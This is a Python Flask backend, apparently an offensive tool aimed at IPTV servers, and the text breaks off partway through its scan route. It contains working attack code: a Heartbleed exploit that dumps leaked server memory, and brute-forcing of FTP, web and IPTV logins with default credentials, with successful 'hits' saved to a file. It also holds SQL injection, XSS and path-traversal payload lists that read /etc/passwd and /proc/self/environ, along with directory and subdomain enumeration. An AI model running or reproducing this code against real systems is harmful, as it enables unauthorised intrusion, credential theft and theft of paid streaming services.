#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import Flask, request, jsonify
from flask_cors import CORS
import socket
import threading
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor
import ftplib
import re
import time
from datetime import datetime
import random
import os
import sys
import binascii
import select
import struct
from urllib.parse import urlparse, urljoin, parse_qs
from collections import deque

# Intentar importar pysocks para soporte SOCKS
try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
CORS(app)

# ===== CONFIGURACIÓN =====
TIMEOUT = 3
MAX_WORKERS = 20
BASE_DIR = "/tmp/cherry_data"
os.makedirs(BASE_DIR, exist_ok=True)
os.makedirs(f"{BASE_DIR}/logs", exist_ok=True)
os.makedirs(f"{BASE_DIR}/complete", exist_ok=True)
os.makedirs(f"{BASE_DIR}/hits", exist_ok=True)
os.makedirs(f"{BASE_DIR}/combo", exist_ok=True)

# ===== NETWORK INTERCEPTOR =====
class NetworkInterceptor:
    def __init__(self):
        self.connections = []
        self.ips = set()
        self.lock = threading.Lock()
    
    def capture(self, host, port, protocol="tcp"):
        conn = f"{host}:{port}"
        with self.lock:
            if conn not in self.connections:
                self.connections.append(conn)
                self.ips.add(host)
                return True
        return False
    
    def get_stats(self):
        with self.lock:
            return {
                'connections': self.connections[-50:],
                'unique_ips': list(self.ips)[-20:],
                'total': len(self.connections)
            }

network_interceptor = NetworkInterceptor()

# Hook para capturar conexiones socket
original_socket_connect = socket.socket.connect
def hooked_connect(self, *args, **kwargs):
    try:
        if args:
            host, port = args[0]
            network_interceptor.capture(host, port)
    except:
        pass
    return original_socket_connect(self, *args, **kwargs)
socket.socket.connect = hooked_connect

# ===== SISTEMA DE LOGS =====
class Logger:
    def __init__(self, target):
        self.target = target
        self.log_dir = f"{BASE_DIR}/logs/{target.replace('/', '_')}"
        os.makedirs(self.log_dir, exist_ok=True)
        self.handlers = {}
    
    def get_handler(self, name):
        if name not in self.handlers:
            self.handlers[name] = open(f"{self.log_dir}/{name}.log", 'a', encoding='utf-8')
        return self.handlers[name]
    
    def write(self, category, message):
        handler = self.get_handler(category)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        handler.write(f"[{timestamp}] {message}\n")
        handler.flush()
    
    def close_all(self):
        for h in self.handlers.values():
            h.close()

current_logger = None

def set_current_logger(target):
    global current_logger
    current_logger = Logger(target)
    return current_logger

# ===== PUERTOS IPTV COMPLETOS =====
IPTV_PORTS = [
    80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 443, 444, 445,
    8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089,
    8443, 8444, 8445, 8446, 8447, 8448, 8449,
    8880, 8881, 8882, 8883, 8884, 8885, 8886, 8887, 8888, 8889,
    2082, 2083, 2086, 2087, 2095, 2096, 2052, 2053,
    25461, 25462, 25463, 25464, 25465, 25466, 25467, 25468, 25469, 25470,
    25500, 25501, 25502, 25503, 25504, 25505,
    1935, 1936, 1937, 1938, 1939, 1940, 554, 8554,
    5000, 5001, 5002, 5003, 5004, 5005, 5006, 5007, 5008, 5009,
    3000, 3001, 3002, 3003, 3004, 3005, 3006, 3007, 3008, 3009,
    4000, 4001, 4002, 4003, 4004, 4005, 4006, 4007, 4008, 4009,
    6000, 6001, 6002, 6003, 6004, 6005, 6006, 6007, 6008, 6009,
    7000, 7001, 7002, 7003, 7004, 7005, 7006, 7007, 7008, 7009,
    8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009,
    9000, 9001, 9002, 9003, 9004, 9005, 9006, 9007, 9008, 9009,
    10000, 10001, 10002, 10003, 10004, 10005, 11000, 12000, 13000,
    14000, 15000, 16000, 17000, 18000, 19000, 20000, 21000, 22000,
    23000, 24000, 25000, 26000, 27000, 28000, 29000, 30000
]

# ===== ENDPOINTS IPTV =====
IPTV_ENDPOINTS = [
    '/player_api.php', '/get.php', '/panel_api.php', '/api.php',
    '/xmltv.php', '/live', '/movie', '/series',
    '/streaming/clients_live.php', '/portal.php', '/enigma2.php',
    '/playlist.m3u', '/tv.m3u', '/live.m3u8', '/index.php',
    '/admin.php', '/login.php', '/user.php', '/users.php',
    '/clients.php', '/client.php', '/api/live.php', '/api/movie.php',
    '/api/series.php', '/panel/', '/admin/', '/manager/', '/control/',
    '/server/', '/iptv/', '/stream/', '/hls/', '/dash/', '/vod/',
    '/movies/', '/series/', '/channels/', '/live/', '/livestream/',
    '/livetv/', '/tv/', '/radio/'
]

# ===== LISTA DE DIRECTORIOS PARA FUERZA BRUTA =====
DIRECTORY_LIST = [
    '/admin', '/panel', '/cpanel', '/login', '/wp-admin', '/manager',
    '/phpmyadmin', '/phpPgAdmin', '/mysql', '/sql', '/backup', '/backups',
    '/dump', '/dumps', '/db', '/.git', '/.env', '/.svn', '/config',
    '/configuration', '/settings', '/api', '/v1', '/v2', '/v3',
    '/user', '/users', '/account', '/accounts', '/profile', '/profiles',
    '/admin.php', '/panel.php', '/login.php', '/user.php', '/users.php',
    '/server-status', '/server-info', '/info.php', '/phpinfo.php',
    '/xmlrpc.php', '/wp-login.php', '/wp-content', '/wp-includes',
    '/joomla', '/administrator', '/components', '/modules',
    '/drupal', '/sites', '/sites/default', '/sites/all',
    '/cgi-bin', '/cgi-bin/status', '/cgi-bin/test.cgi'
]

# ===== CREDENCIALES COMUNES PARA FUERZA BRUTA =====
COMMON_CREDS = [
    ('admin', 'admin'), ('admin', '1234'), ('admin', 'password'),
    ('admin', '123456'), ('admin', 'admin123'), ('admin', '12345'),
    ('root', 'root'), ('root', 'toor'), ('root', '123456'),
    ('user', 'user'), ('user', '1234'), ('test', 'test'),
    ('test', '1234'), ('demo', 'demo'), ('demo', '1234'),
    ('administrator', 'administrator'), ('guest', 'guest'),
    ('support', 'support'), ('ftp', 'ftp'), ('mysql', 'mysql'),
    ('postgres', 'postgres'), ('oracle', 'oracle'), ('tomcat', 'tomcat'),
    ('manager', 'manager'), ('supervisor', 'supervisor'),
    ('admin', '123456789'), ('admin', 'qwerty'), ('admin', 'abc123'),
    ('root', '123456'), ('root', 'qwerty'), ('user', 'password')
]

# ===== PAYLOADS PARA SQL INJECTION =====
SQLI_PAYLOADS = [
    "'", "\"", "';", "\";", "' OR '1'='1", "\" OR \"1\"=\"1",
    "' OR 1=1--", "\" OR 1=1--", "' OR '1'='1'--", "admin'--",
    "1' AND '1'='1", "1' AND '1'='2", "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--"
]

# ===== PAYLOADS PARA XSS =====
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>"
]

# ===== PAYLOADS PARA LFI/RFI =====
LFI_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "/proc/self/environ",
    "/proc/self/cmdline"
]

# ===== SUBDOMINIOS COMUNES =====
COMMON_SUBDOMAINS = [
    'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop',
    'ns1', 'ns2', 'ns3', 'dns', 'dns1', 'dns2', 'dns3',
    'cpanel', 'whm', 'webdisk', 'webdav', 'blog', 'shop', 'store',
    'api', 'api1', 'api2', 'api3', 'dev', 'development', 'stage',
    'test', 'testing', 'demo', 'admin', 'administrator', 'panel',
    'secure', 'vpn', 'remote', 'server', 'mailserver', 'mx',
    'email', 'imap', 'smtp', 'pop3', 'web', 'www2', 'www3',
    'forum', 'chat', 'help', 'support', 'helpdesk', 'ticket'
]

# ===== FUNCIÓN DE GEOLOCALIZACIÓN =====
def get_ip_location(ip: str) -> dict:
    try:
        url = f"http://ip-api.com/json/{ip}"
        response = requests.get(url, timeout=3)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                location = ""
                if data.get('city'):
                    location += data['city'] + ", "
                if data.get('regionName'):
                    location += data['regionName'] + ", "
                if data.get('country'):
                    location += data['country']
                location = location.strip(', ')
                country_code = data.get('countryCode', '')
                flag = '🌍'
                if country_code and len(country_code) == 2:
                    try:
                        flag = ''.join(chr(ord(c.upper()) + 127397) for c in country_code)
                    except:
                        pass
                return {
                    'location': location if location else 'Ubicación desconocida',
                    'country_flag': flag,
                    'isp': data.get('isp', ''),
                    'org': data.get('org', '')
                }
    except:
        pass
    return {
        'location': 'No disponible',
        'country_flag': '🌍',
        'isp': '',
        'org': ''
    }

# ===== FUNCIÓN PARA OBTENER PROXYS GRATIS (HTTP + SOCKS) =====
def get_free_proxies(proxy_type='all'):
    proxies = {'http': [], 'socks4': [], 'socks5': []}
    
    sources = {
        'http': [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        ],
        'socks4': [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt"
        ],
        'socks5': [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
        ]
    }
    
    types_to_fetch = ['http', 'socks4', 'socks5'] if proxy_type == 'all' else [proxy_type]
    
    for pt in types_to_fetch:
        for url in sources.get(pt, []):
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200:
                    for line in r.text.strip().split('\n'):
                        proxy = line.strip()
                        if ':' in proxy:
                            proxies[pt].append(proxy)
                            if len(proxies[pt]) >= 20:
                                break
            except:
                continue
    
    return {
        'http': list(set(proxies['http']))[:20],
        'socks4': list(set(proxies['socks4']))[:20],
        'socks5': list(set(proxies['socks5']))[:20]
    }

def get_proxy_connection(proxy_type, proxy_host, proxy_port, target_host, target_port, username=None, password=None):
    """Obtiene una conexión socket a través de proxy SOCKS/HTTP"""
    if proxy_type in ['socks4', 'socks5'] and SOCKS_AVAILABLE:
        s = socks.socksocket()
        if proxy_type == 'socks5':
            s.set_proxy(socks.SOCKS5, proxy_host, int(proxy_port), username=username, password=password)
        else:
            s.set_proxy(socks.SOCKS4, proxy_host, int(proxy_port), username=username)
        s.connect((target_host, int(target_port)))
        return s
    elif proxy_type == 'http':
        # HTTP CONNECT tunnel
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((proxy_host, int(proxy_port)))
        connect_req = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}:{target_port}\r\n\r\n"
        s.send(connect_req.encode())
        response = s.recv(1024).decode()
        if '200' in response:
            return s
        s.close()
        raise Exception("HTTP CONNECT failed")
    else:
        # Conexión directa
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_host, int(target_port)))
        return s

# ===== FUNCIONES DE UTILIDAD =====
def get_service_name(port):
    services = {
        21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 80: 'HTTP',
        110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB', 993: 'IMAPS',
        995: 'POP3S', 3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL',
        5900: 'VNC', 6379: 'Redis', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt',
        25461: 'IPTV', 25462: 'IPTV', 25463: 'IPTV', 25464: 'IPTV', 25465: 'IPTV',
        27017: 'MongoDB', 8888: 'HTTP-Proxy', 8081: 'HTTP-Alt2'
    }
    return services.get(port, f'Port-{port}')

def grab_banner(host, port, proxy_info=None):
    try:
        if proxy_info:
            s = get_proxy_connection(
                proxy_info.get('type', 'direct'),
                proxy_info.get('host', ''),
                proxy_info.get('port', 0),
                host, port
            )
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, port))
        
        if port in [21, 25, 110, 143, 443, 993, 995, 22]:
            banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
        elif port in [80, 443, 8080, 8443, 25461, 25462, 25463]:
            s.send(b"HEAD / HTTP/1.0\r\n\r\n")
            banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
        else:
            banner = ""
        s.close()
        return banner[:200]
    except:
        return ""

# ===== EXPLOITS REALES =====
def check_ftp_vulnerabilities(host, port=21):
    results = {'anonymous': False, 'creds': []}
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=3)
        ftp.login()
        results['anonymous'] = True
        try:
            files = ftp.nlst()
            results['files'] = files[:5]
        except:
            pass
        ftp.quit()
    except:
        pass
    for user, pwd in COMMON_CREDS[:5]:
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=2)
            ftp.login(user, pwd)
            results['creds'].append({'username': user, 'password': pwd})
            ftp.quit()
            break
        except:
            continue
    return results

def check_http_vulnerabilities(host, port, ssl=False):
    protocol = 'https' if ssl else 'http'
    base_url = f"{protocol}://{host}:{port}"
    results = {'admin_panels': [], 'm3u_files': [], 'sensitive_files': [], 'creds': []}
    paths = {
        'admin': ['/admin', '/panel', '/cpanel', '/login', '/wp-admin', '/manager'],
        'm3u': ['/playlist.m3u', '/tv.m3u', '/live.m3u', '/get.php', '/player_api.php'],
        'sensitive': ['/phpinfo.php', '/.env', '/config.php', '/backup.sql', '/info.php']
    }
    for category, path_list in paths.items():
        for path in path_list:
            try:
                url = base_url + path
                r = requests.get(url, timeout=2, verify=False)
                if r.status_code == 200:
                    if category == 'admin':
                        results['admin_panels'].append(url)
                    elif category == 'm3u' and ('#EXTM3U' in r.text or '.m3u' in url):
                        results['m3u_files'].append(url)
                    elif category == 'sensitive':
                        results['sensitive_files'].append(url)
            except:
                continue
    return results

def check_iptv_vulnerabilities(host, port):
    protocol = 'https' if port in [443, 8443, 25462, 25464] else 'http'
    base_url = f"{protocol}://{host}:{port}"
    results = {'creds': [], 'm3u_urls': []}
    for endpoint in IPTV_ENDPOINTS[:10]:
        for user, pwd in COMMON_CREDS[:10]:
            try:
                if 'player_api' in endpoint or 'api.php' in endpoint:
                    url = f"{base_url}{endpoint}?username={user}&password={pwd}"
                elif 'get.php' in endpoint:
                    url = f"{base_url}{endpoint}?username={user}&password={pwd}&type=m3u_plus"
                else:
                    continue
                r = requests.get(url, timeout=2, verify=False)
                if r.status_code == 200:
                    if 'player_api' in endpoint:
                        try:
                            data = r.json()
                            if data.get('user_info', {}).get('auth') == 1:
                                results['creds'].append({'username': user, 'password': pwd})
                        except:
                            pass
                    elif '#EXTM3U' in r.text:
                        results['m3u_urls'].append(url)
                        results['creds'].append({'username': user, 'password': pwd})
            except:
                continue
    return results

# ===== HEARTBLEED EXPLOIT =====
hello = bytes.fromhex('''
16 03 02 00 dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00
00 0f 00 01 01
'''.replace('\n', '').replace(' ', ''))

hb = bytes.fromhex('''
18 03 02 00 03
01 40 00
'''.replace('\n', '').replace(' ', ''))

def receive_all(s, length, timeout=5):
    end_time = time.time() + timeout
    data = b''
    remaining = length
    while remaining > 0:
        if time.time() > end_time:
            return None
        r, w, e = select.select([s], [], [], 0.5)
        if s in r:
            try:
                chunk = s.recv(remaining)
                if not chunk:
                    return None
                data += chunk
                remaining -= len(chunk)
            except:
                return None
        else:
            continue
    return data

def receive_message(s):
    header = receive_all(s, 5)
    if header is None:
        return None, None, None
    msg_type, version, length = struct.unpack('>BHH', header)
    payload = receive_all(s, length, 10)
    if payload is None:
        return None, None, None
    return msg_type, version, payload

def hexdump(data):
    result = []
    for i in range(0, min(len(data), 256), 16):
        s = data[i:i+16]
        hexa = ' '.join(f'{b:02x}' for b in s)
        text = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in s)
        result.append(f'{i:04x}: {hexa:<48} {text}')
    return '\n'.join(result)

def check_heartbleed(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        s.send(hello)
        
        server_version = None
        while True:
            msg_type, version, payload = receive_message(s)
            if msg_type is None:
                break
            if msg_type == 22 and payload and payload[0] == 0x0E:
                server_version = version
                break
            if msg_type == 21:
                break
        
        if server_version is None:
            s.close()
            return {'vulnerable': False, 'error': 'No Server Hello'}
        
        s.send(hb)
        msg_type, version, payload = receive_message(s)
        s.close()
        
        if msg_type == 24 and payload and len(payload) > 3:
            return {
                'vulnerable': True,
                'data_size': len(payload),
                'data_hex': hexdump(payload)[:500]
            }
        return {'vulnerable': False}
    except Exception as e:
        return {'vulnerable': False, 'error': str(e)}

# ===== SNI BRUTE FORCE =====
def sni_bruteforce(host, port=443, sni_list=None):
    if sni_list is None:
        sni_list = [
            "iptv.live", "panel.tv", "xui.com", "live-stream.net",
            "access.iptv", "client.xui", "userpanel.pro", "tvserver.world",
            "xtream-codes.com", "iptv-provider.com", "streaming-server.com",
            "www.google.com", "www.cloudflare.com", "www.amazon.com",
            "api.cloudflare.com", "api.google.com", "ssl.google.com"
        ]
    
    results = []
    for sni in sni_list[:10]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            # Construir ClientHello con SNI
            client_hello = hello
            sock.send(client_hello)
            
            readable, _, _ = select.select([sock], [], [], 2)
            if readable:
                response = sock.recv(4096)
                if response and response[0] == 0x16:
                    results.append({
                        'sni': sni,
                        'success': True,
                        'response': 'TLS response'
                    })
                else:
                    results.append({'sni': sni, 'success': False})
            else:
                results.append({'sni': sni, 'success': False, 'error': 'timeout'})
            sock.close()
        except Exception as e:
            results.append({'sni': sni, 'success': False, 'error': str(e)})
    
    return results

# ===== M3U PROCESSING =====
def extract_from_m3u(url):
    try:
        r = requests.get(url, timeout=10)
        if r.status_code != 200:
            return {'success': False, 'error': f'HTTP {r.status_code}'}
        
        content = r.text
        credentials = []
        categories = []
        
        # Buscar credenciales en la URL
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            username = params.get('username', [''])[0] or params.get('user', [''])[0]
            password = params.get('password', [''])[0] or params.get('pass', [''])[0]
            if username and password:
                credentials.append({'username': username, 'password': password})
        
        # Buscar en el contenido M3U
        lines = content.split('\n')
        streams = 0
        for line in lines:
            if line.startswith('#EXTINF'):
                streams += 1
                # Buscar group-title (categorías)
                group_match = re.search(r'group-title="([^"]+)"', line)
                if group_match and group_match.group(1) not in categories:
                    categories.append(group_match.group(1))
            elif line and not line.startswith('#') and ('http://' in line or 'https://' in line):
                # Es una URL de stream, podría contener credenciales
                stream_url = line.strip()
                stream_parsed = urlparse(stream_url)
                if stream_parsed.query:
                    params = parse_qs(stream_parsed.query)
                    username = params.get('username', [''])[0] or params.get('user', [''])[0]
                    password = params.get('password', [''])[0] or params.get('pass', [''])[0]
                    if username and password:
                        cred = {'username': username, 'password': password}
                        if cred not in credentials:
                            credentials.append(cred)
        
        return {
            'success': True,
            'server_url': f"{parsed.scheme}://{parsed.netloc}",
            'server_ip': socket.gethostbyname(parsed.hostname),
            'credentials': credentials,
            'streams_count': streams,
            'categories': categories[:20]
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ===== VERIFY CREDENTIALS =====
def verify_credentials(host, port, username, password):
    try:
        # Probar HTTP primero
        for proto in ['http', 'https']:
            url = f"{proto}://{host}:{port}/player_api.php?username={username}&password={password}&action=user_info"
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                try:
                    data = r.json()
                    if data.get('user_info', {}).get('auth') == 1:
                        user_info = data.get('user_info', {})
                        exp_date = user_info.get('exp_date', '')
                        created_at = user_info.get('created_at', '')
                        
                        # Guardar hit en archivo
                        hit_file = f"{BASE_DIR}/hits/hits.txt"
                        with open(hit_file, 'a') as f:
                            f.write(f"{host}:{port}|{username}|{password}|{exp_date}|{created_at}\n")
                        
                        return {
                            'success': True,
                            'hit': {
                                'host': host,
                                'port': port,
                                'username': username,
                                'password': password,
                                'exp_date': exp_date,
                                'created_at': created_at,
                                'active_cons': user_info.get('active_cons', 0),
                                'max_connections': user_info.get('max_connections', 0)
                            }
                        }
                except:
                    pass
        return {'success': False}
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ===== FIND MIRRORS =====
def find_mirrors(host):
    mirrors = []
    try:
        # Resolver IP del host
        ip = socket.gethostbyname(host)
        
        # Escanear puertos comunes en la misma IP
        common_ports = [80, 443, 8080, 8443, 8888, 25461, 25462, 21, 22, 3306]
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            if sock.connect_ex((ip, port)) == 0:
                service = get_service_name(port)
                mirrors.append({'host': ip, 'port': port, 'service': service})
            sock.close()
        
        # Buscar subdominios comunes
        for sub in COMMON_SUBDOMAINS[:20]:
            try:
                subdomain = f"{sub}.{host}"
                sub_ip = socket.gethostbyname(subdomain)
                if sub_ip != ip:
                    # Escanear puertos en el subdominio
                    for port in [80, 443]:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        if sock.connect_ex((sub_ip, port)) == 0:
                            mirrors.append({
                                'host': subdomain,
                                'ip': sub_ip,
                                'port': port,
                                'service': 'HTTP' if port == 80 else 'HTTPS'
                            })
                        sock.close()
            except:
                continue
        
        return {'success': True, 'mirrors': mirrors[:20]}
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ===== FUERZA BRUTA DE DIRECTORIOS =====
def brute_force_directories(host, port=80, ssl=False):
    protocol = 'https' if ssl else 'http'
    base_url = f"{protocol}://{host}:{port}"
    results = []
    
    def check_path(path):
        url = base_url + path
        try:
            r = requests.get(url, timeout=3, verify=False)
            if r.status_code in [200, 301, 302, 401, 403]:
                return {
                    'path': path,
                    'status': r.status_code,
                    'url': url,
                    'size': len(r.text)
                }
        except:
            pass
        return None
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_path, path): path for path in DIRECTORY_LIST}
        for future in futures:
            result = future.result()
            if result:
                results.append(result)
    
    return results

# ===== FUERZA BRUTA DE LOGIN =====
def brute_force_login(host, port=80, ssl=False, login_path='/login.php', username_field='username', password_field='password'):
    protocol = 'https' if ssl else 'http'
    login_url = f"{protocol}://{host}:{port}{login_path}"
    results = []
    
    def try_login(username, password):
        try:
            data = {username_field: username, password_field: password}
            r = requests.post(login_url, data=data, timeout=3, verify=False, allow_redirects=False)
            
            # Detectar éxito por código o redirección
            if r.status_code == 302 or r.status_code == 200 and ('dashboard' in r.text.lower() or 'welcome' in r.text.lower()):
                return {'username': username, 'password': password, 'success': True}
        except:
            pass
        return None
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(try_login, u, p): (u, p) for u, p in COMMON_CREDS[:30]}
        for future in futures:
            result = future.result()
            if result:
                results.append(result)
    
    return results

# ===== SQL INJECTION SCANNER =====
def scan_sql_injection(host, port=80, ssl=False, path='/', param='id'):
    protocol = 'https' if ssl else 'http'
    base_url = f"{protocol}://{host}:{port}{path}"
    results = []
    
    def test_payload(payload):
        try:
            url = f"{base_url}?{param}={payload}"
            r = requests.get(url, timeout=3, verify=False)
            
            # Detectar errores SQL
            if 'mysql_fetch' in r.text.lower() or 'sql' in r.text.lower() or 'database error' in r.text.lower():
                return {'payload': payload, 'vulnerable': True, 'evidence': 'SQL error detected'}
            
            # Comparar con respuesta normal
            normal = requests.get(f"{base_url}?{param}=1", timeout=3, verify=False)
            if len(r.text) != len(normal.text):
                return {'payload': payload, 'vulnerable': True, 'evidence': 'Content length difference'}
        except:
            pass
        return None
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(test_payload, p): p for p in SQLI_PAYLOADS}
        for future in futures:
            result = future.result()
            if result:
                results.append(result)
    
    return results

# ===== XSS SCANNER =====
def scan_xss(host, port=80, ssl=False, path='/', param='q'):
    protocol = 'https' if ssl else 'http'
    base_url = f"{protocol}://{host}:{port}{path}"
    results = []
    
    def test_payload(payload):
        try:
            url = f"{base_url}?{param}={payload}"
            r = requests.get(url, timeout=3, verify=False)
            
            # Verificar si el payload se refleja sin filtrar
            if payload in r.text and '<' in payload and '>' in payload:
                return {'payload': payload, 'vulnerable': True, 'evidence': 'Payload reflected'}
        except:
            pass
        return None
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(test_payload, p): p for p in XSS_PAYLOADS}
        for future in futures:
            result = future.result()
            if result:
                results.append(result)
    
    return results

# ===== LFI SCANNER =====
def scan_lfi(host, port=80, ssl=False, path='/', param='file'):
    protocol = 'https' if ssl else 'http'
    base_url = f"{protocol}://{host}:{port}{path}"
    results = []
    
    def test_payload(payload):
        try:
            url = f"{base_url}?{param}={payload}"
            r = requests.get(url, timeout=3, verify=False)
            
            # Verificar si se muestran archivos del sistema
            if 'root:' in r.text or '[extensions]' in r.text or 'boot loader' in r.text:
                return {'payload': payload, 'vulnerable': True, 'evidence': 'System file detected'}
        except:
            pass
        return None
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(test_payload, p): p for p in LFI_PAYLOADS}
        for future in futures:
            result = future.result()
            if result:
                results.append(result)
    
    return results

# ===== DNS SCAN =====
def dns_scan(domains):
    results = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        def resolve(domain):
            try:
                ip = socket.gethostbyname(domain)
                location = get_ip_location(ip)
                return {
                    'domain': domain,
                    'ip': ip,
                    'location': location['location'],
                    'flag': location['country_flag']
                }
            except:
                return {'domain': domain, 'ip': None, 'error': 'DNS failed'}
        
        futures = {executor.submit(resolve, d): d for d in domains[:50]}
        for future in futures:
            result = future.result(timeout=5)
            results.append(result)
    
    return results

# ===== SUBDOMAIN SCAN =====
def subdomain_scan(domain):
    results = []
    for sub in COMMON_SUBDOMAINS:
        try:
            subdomain = f"{sub}.{domain}"
            ip = socket.gethostbyname(subdomain)
            results.append({'subdomain': subdomain, 'ip': ip})
        except:
            continue
    return results

# ===== ESCANEO PRINCIPAL =====
def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        result = sock.connect_ex((host, port))
        
        if result == 0:
            service = get_service_name(port)
            banner = grab_banner(host, port)
            vulnerabilities = []
            
            if port == 21:
                ftp_res = check_ftp_vulnerabilities(host, port)
                if ftp_res.get('anonymous'):
                    vulnerabilities.append({'type': 'ftp_anonymous', 'risk': 'high'})
                if ftp_res.get('creds'):
                    vulnerabilities.append({'type': 'ftp_weak_creds', 'creds': ftp_res['creds'], 'risk': 'critical'})
            
            elif port in [80, 443, 8080, 8443, 25461, 25462, 25463]:
                http_res = check_http_vulnerabilities(host, port, ssl=(port in [443,8443,25462]))
                if http_res.get('admin_panels'):
                    vulnerabilities.append({'type': 'admin_panel', 'urls': http_res['admin_panels'], 'risk': 'medium'})
                if http_res.get('m3u_files'):
                    vulnerabilities.append({'type': 'm3u_exposed', 'urls': http_res['m3u_files'], 'risk': 'high'})
                if http_res.get('sensitive_files'):
                    vulnerabilities.append({'type': 'sensitive_exposed', 'urls': http_res['sensitive_files'], 'risk': 'critical'})
                
                iptv_res = check_iptv_vulnerabilities(host, port)
                if iptv_res.get('creds'):
                    vulnerabilities.append({'type': 'iptv_creds', 'creds': iptv_res['creds'], 'risk': 'critical'})
                if iptv_res.get('m3u_urls'):
                    vulnerabilities.append({'type': 'iptv_m3u', 'urls': iptv_res['m3u_urls'], 'risk': 'high'})
            
            sock.close()
            
            return {
                'port': port,
                'open': True,
                'service': service,
                'banner': banner,
                'vulnerabilities': vulnerabilities,
                'vulnerable': len(vulnerabilities) > 0
            }
        sock.close()
        return {'port': port, 'open': False}
    except Exception as e:
        return {'port': port, 'open': False, 'error': str(e)}

# ===== RUTAS API =====
@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({
        'status': 'ok',
        'version': '5.0 - COMPLETE EDITION',
        'ports_available': len(IPTV_PORTS),
        'features': {
            'heartbleed': True,
            'm3u': True,
            'sni': True,
            'mirrors': True,
            'directory_bruteforce': True,
            'login_bruteforce': True,
            'sqli': True,
            'xss': True,
            'lfi': True,
            'dns_scan': True,
            'subdomain_scan': True,
            'socks_proxy': SOCKS_AVAILABLE,
            'network_interceptor': True,
            'logging': True
        },
        'message': '🔥 CHERRY BACKEND - ULTIMATE COMPLETE EDITION'
    })

@app.route('/api/scan', methods=['POST'])
def scan():
    data = request.json
    host = data.get('host', '').strip()
    ports_str = data.get('ports', '').strip()
    
    if not host:
        return jsonify({'error': 'Host requerido'}), 400
    
    host = host.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
    
